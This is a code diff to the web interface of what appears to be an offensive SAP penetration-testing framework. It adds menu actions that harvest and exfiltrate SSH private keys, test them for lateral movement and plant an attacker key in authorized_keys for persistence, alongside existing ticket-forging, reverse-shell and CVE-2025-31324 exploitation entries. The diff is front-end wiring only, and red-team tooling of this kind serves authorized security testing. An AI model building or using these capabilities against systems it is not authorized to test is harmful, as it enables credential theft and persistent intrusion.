@@ -917,6 +917,10 @@ body {
       <div class="ctx-item" data-action="forge_ticket">&#127915; Forge MYSAPSSO2 Ticket (impersonate any user)</div>
       <div class="ctx-item" data-action="propagate_ticket">&#128640; Propagate Forged Ticket (HTTP+RFC across trust)</div>
       <div class="ctx-sep"></div>
+      <div class="ctx-item" data-action="ssh_harvest">&#128273; SSH Key Harvest (exfiltrate keys + known_hosts)</div>
+      <div class="ctx-item" data-action="ssh_test_keys">&#128640; SSH Lateral Movement (test keys against targets)</div>
+      <div class="ctx-item" data-action="ssh_plant_key" style="color:#f85149">&#128274; SSH Plant Key (authorized_keys persistence)</div>
+      <div class="ctx-sep"></div>
       <div class="ctx-item" data-action="propagate">&#128640; Propagate (exploit next hop)</div>
       <div class="ctx-item" data-action="harvest_btp_creds">&#9729; Harvest BTP Credentials (lateral to cloud)</div>
       <div class="ctx-item" data-action="verify_pp_impersonation">&#127919; Verify PP Impersonation (Live Probe)</div>
@@ -4006,6 +4010,9 @@ function showCtxMenu(e, sid) {
     //   - CVE-2025-31324 webshell: Java only, unauth.
     'os_terminal':      hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324,
     'reverse_shell':    hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324,
+    'ssh_harvest':      !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
+    'ssh_test_keys':    !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
+    'ssh_plant_key':    !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
     'harvest_scc':          hasGwVuln || hasCve31324 || hasCreatedUsers,
     // LPE-escalating SCC hash dump — needs OS-exec channel AND a
     // viable Linux LPE (copyfail or dirtyfrag).  Windows targets are
@@ -4178,6 +4185,9 @@ function showCtxMenu(e, sid) {
         : 'Requires Java/dual-stack + CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint'),
     'os_terminal':      'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), or CVE-2025-31324 webshell (Java)',
     'reverse_shell':    'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), or CVE-2025-31324 webshell (Java)',
+    'ssh_harvest':      'Requires OS-exec on a Linux host — reads /etc/passwd + .ssh dirs via GW SAPXPG, CVE-2025-31324, or SXPG_STEP_XPG_START',
+    'ssh_test_keys':    'Requires OS-exec on a Linux host — harvests SSH keys first, then tests them against known targets',
+    'ssh_plant_key':    'Requires OS-exec on a Linux host — plants SAPMAP ed25519 pubkey into authorized_keys for persistence',
     'harvest_scc':          'Requires OS-exec on this node AND an SCC on the same host IP',
     'harvest_scc_hashes_via_lpe':
         (isWindows
@@ -4301,6 +4311,9 @@ function showCtxMenu(e, sid) {
     'exploit_linux_lpe': isWindows,
     'check_windows_lpe':   !isWindows,
     'exploit_windows_lpe': !isWindows,
+    'ssh_harvest':       isWindows,
+    'ssh_test_keys':     isWindows,
+    'ssh_plant_key':     isWindows,
     // SCC harvest items — hidden entirely unless an SCC is on the same host
     'harvest_scc':          !_hasSccOnSameHost(n),
     'harvest_scc_hashes_via_lpe': !_hasSccOnSameHost(n),
@@ -5506,6 +5519,24 @@ async function ctxAction(action) {
     // inside the forge orchestrator (step 2.5) — no standalone
     // menu entry.  Operators wanting an isolated check should use
     // ``python3 tools/check_sso2_profile.py`` from the CLI.
+    case 'ssh_harvest':
+      if (confirm(`Harvest SSH keys from ${sid}?\n\nThis reads /etc/passwd, enumerates .ssh directories, and exfiltrates private keys, known_hosts, authorized_keys, and SSH config files.\n\nResults are saved to loot/ssh/.`))
+        await api('POST', `node/${sid}/ssh_harvest`);
+      break;
+    case 'ssh_test_keys': {
+      if (!confirm(`SSH Lateral Movement from ${sid}?\n\nThis will:\n1. Harvest SSH keys (if not already done)\n2. Test every key×target×username combination via SSH\n3. Report successful logins as CRITICAL findings\n\nTargets are derived from known_hosts files and the SAPMAP landscape.`))
+        break;
+      await api('POST', `node/${sid}/ssh_test_keys`);
+      break;
+    }
+    case 'ssh_plant_key': {
+      const tu = prompt(`SSH Plant Key on ${sid}\n\nEnter the target OS username to plant the SAPMAP SSH public key into (e.g. sapadm, s4hadm).\n\nThis appends the SAPMAP ed25519 pubkey to ~user/.ssh/authorized_keys for persistent access.`, '');
+      if (!tu) break;
+      if (!confirm(`⚠️ This will modify authorized_keys for user "${tu}" on ${sid}.\n\nThe SAPMAP ed25519 private key will be saved to loot/ for future access.\n\nProceed?`))
+        break;
+      await api('POST', `node/${sid}/ssh_plant_key`, { target_user: tu });
+      break;
+    }
     case 'forge_ticket':
       showForgeTicketModal(sid);
       break;
